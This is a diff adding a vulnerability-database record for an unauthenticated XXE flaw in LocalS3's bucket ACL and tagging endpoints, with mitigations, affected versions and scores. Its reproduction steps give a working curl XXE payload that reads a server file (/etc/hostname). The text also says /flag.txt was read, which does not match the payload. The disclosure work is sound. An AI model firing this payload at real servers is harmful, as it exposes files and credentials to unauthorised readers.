@@ -1,0 +1,128 @@
+advisory_id: GHSA-2466-4485-4pxj
+datasource_id: github_osv/GHSA-2466-4485-4pxj
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-2466-4485-4pxj/GHSA-2466-4485-4pxj.json
+aliases: []
+summary: |
+  LocalS3 Project Bucket Operations Vulnerable to XML External Entity (XXE) Injection
+  ## Description
+
+  The LocalS3 project contains an XML External Entity (XXE) Injection vulnerability in its bucket operations that process XML data. Specifically, the vulnerability exists in the bucket ACL and bucket tagging operations. The application processes XML input without properly disabling external entity resolution, allowing an attacker to read arbitrary files from the server's filesystem.
+
+  The vulnerability occurs because the XML parser used by the application processes DOCTYPE declarations and allows external entity references. When processing bucket ACL or tagging operations, the application includes the content of external entities in its response, effectively exposing sensitive files from the server.
+
+  This type of vulnerability can be exploited to read sensitive files, perform server-side request forgery (SSRF), or potentially achieve denial of service through various XXE attack vectors.
+
+  ## Steps to Reproduce
+
+  1. Create a test bucket using PUT request to http://[server]/[bucket-name]
+
+      ```
+      curl -X PUT "http://app/xxe-test-bucket2"```
+      ```
+
+  2. Send a PUT request to http://[server]/[bucket-name]?acl with the following XXE payload:
+     ```
+     curl -X PUT "http://app/xxe-test-bucket2?acl" \
+     -H "Content-Type: application/xml" \
+     -d '<?xml version="1.0" encoding="UTF-8"?>
+     <!DOCTYPE AccessControlPolicy [
+         <!ENTITY xxe SYSTEM "file:///etc/hostname" >
+     ]>
+     <AccessControlPolicy>
+         <Owner>
+             <ID>&xxe;</ID>
+             <DisplayName>test</DisplayName>
+         </Owner>
+         <AccessControlList>
+             <Grant>
+                 <Grantee xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="CanonicalUser">
+                     <ID>test</ID>
+                     <DisplayName>test</DisplayName>
+                 </Grantee>
+                 <Permission>FULL_CONTROL</Permission>
+             </Grant>
+         </AccessControlList>
+     </AccessControlPolicy>'
+     ```
+
+  3. Send a GET request to `http://[server]/[bucket-name]?acl` to retrieve the bucket ACL
+
+      ```
+      curl "http://app/xxe-test-bucket2?acl"
+      ```
+
+  After performing these steps, the content of the target file (/flag.txt in this case) will be included in the response within the ID field of the Owner element.
+
+  ## Mitigations
+
+  - Configure the XML parser to disable external entity resolution by setting XMLConstants.FEATURE_SECURE_PROCESSING to true
+  - Disable DOCTYPE declarations in the XML parser configuration
+  - Implement XML input validation and sanitization before processing
+  - Consider using JSON instead of XML for these operations if XML parsing is not strictly necessary
+
+  ## Impact
+
+  The vulnerability requires no authentication and can be exploited by any user who can make HTTP requests to the server. It allows reading arbitrary files from the server's filesystem, which could expose sensitive configuration files, credentials, or other confidential information. The vulnerability can also be used to perform SSRF attacks against internal systems.
+impacted_packages:
+  - purl: pkg:maven/io.github.robothy/local-s3-rest
+    affected_versions: vers:maven/<1.21
+    fixed_versions: vers:maven/1.21
+    affected_packages:
+      - pkg:maven/io.github.robothy/local-s3-rest@1.2
+      - pkg:maven/io.github.robothy/local-s3-rest@1.4
+      - pkg:maven/io.github.robothy/local-s3-rest@1.5
+      - pkg:maven/io.github.robothy/local-s3-rest@1.6
+      - pkg:maven/io.github.robothy/local-s3-rest@1.7
+      - pkg:maven/io.github.robothy/local-s3-rest@1.8
+      - pkg:maven/io.github.robothy/local-s3-rest@1.9
+      - pkg:maven/io.github.robothy/local-s3-rest@1.10
+      - pkg:maven/io.github.robothy/local-s3-rest@1.11
+      - pkg:maven/io.github.robothy/local-s3-rest@1.12
+      - pkg:maven/io.github.robothy/local-s3-rest@1.12.1
+      - pkg:maven/io.github.robothy/local-s3-rest@1.12.2
+      - pkg:maven/io.github.robothy/local-s3-rest@1.13
+      - pkg:maven/io.github.robothy/local-s3-rest@1.14
+      - pkg:maven/io.github.robothy/local-s3-rest@1.15
+      - pkg:maven/io.github.robothy/local-s3-rest@1.16
+      - pkg:maven/io.github.robothy/local-s3-rest@1.17
+      - pkg:maven/io.github.robothy/local-s3-rest@1.18
+      - pkg:maven/io.github.robothy/local-s3-rest@1.19
+      - pkg:maven/io.github.robothy/local-s3-rest@1.20
+    fixed_packages:
+      - pkg:maven/io.github.robothy/local-s3-rest@1.21
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/robothy/local-s3
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/robothy/local-s3
+        commit: d6ed756ceb30c1eb9d4263321ac683d734f8836f
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '6.9'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-2466-4485-4pxj/GHSA-2466-4485-4pxj.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-611
+references:
+  - url: https://github.com/Robothy/local-s3
+    reference_type:
+    reference_id:
+  - url: https://github.com/Robothy/local-s3/commit/d6ed756ceb30c1eb9d4263321ac683d734f8836f
+    reference_type:
+    reference_id:
+  - url: https://github.com/Robothy/local-s3/security/advisories/GHSA-2466-4485-4pxj
+    reference_type:
+    reference_id: GHSA-2466-4485-4pxj
+exploits: []
